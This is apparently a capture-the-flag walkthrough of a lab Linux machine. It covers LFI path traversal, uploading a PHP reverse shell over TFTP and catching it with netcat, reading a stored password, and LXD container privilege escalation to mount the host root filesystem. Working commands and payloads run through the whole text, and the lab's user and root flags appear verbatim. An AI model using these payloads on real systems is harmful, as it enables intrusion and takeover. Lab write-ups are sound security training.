System: Linux
Difficulty: Very Easy

IP Address: 10.129.95.185

Ports are enumerated.
```
kali@kali:~$ sudo nmap 10.129.95.185 -sC -sV -p- -v
```

Here are the results.
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to http://10.129.95.185/index.php?file=home.php
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```

UDP is also scanned.
```
kali@kali:~$ sudo nmap 10.129.95.185 -sU -v
```

A port with the service TFTP has been identified.

On the Web Server, a LFI Vulnerability has been found.
```
http://10.129.95.185/?file=../../../../../../etc/passwd
```

As a result, the page is returned. At the same time, it is possible to see that there is tftp on the server.
```
<SNIP>
mike:x:1000:1000:mike:/home/mike:/bin/bash tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
```

A TFTP connection will be established with the server.
```
tftp 10.129.95.185
```

The `php-reverse-shell.php` will be modified and uploaded to the web server.
```
put php-reverse-shell.php
```

Listen the port on the server.
```
sudo nc -lvnp 4444
```

According to Google Search, the TFTP Directory is located at `/var/lib/tftpboot`.
This link will be executed in the browser to get a shell back.
```
http://10.129.95.185/?file=/var/lib/tftpboot/php-reverse-shell.php
```

It is possible to find a hidden file on the `/var/www/html` directory.
There is a password of the user `mike`.
```
www-data@included:/var/www/html$ cat .htpasswd
cat .htpasswd
mike:Sheffield19
```

The user is changed.
```
su mike
```

The user flag contents is in below.
```
a56ef91d70cfbf2cdb8f454c006935a1
```

Enumerating the user groups.
```
mike@included:/$ id
```

It is possible to see that the user has `lxd` group privileges.
```
uid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd)
```

Here is the link about LXD Group Exploitation: 
```
https://www.hackingarticles.in/lxd-privilege-escalation/
```

The folders are enumerated like that.
```
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18
```

A server will listen to the machine in order to transfer the files.
```
python3 -m http.server 8000
```

Both generated files are transferred to the system.
```
wget http://10.10.14.154:8000/incus.tar.xz
wget http://10.10.14.154:8000/rootfs.squashfs
```

After theses commands, it is possible to reach a session to `root`.
```
lxc image import incus.tar.xz rootfs.squashfs --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
```

The root flag contents is in the directory `/mnt/root/root`.
```
c693d9c7499d9f572ee375d4c14c7bcf
```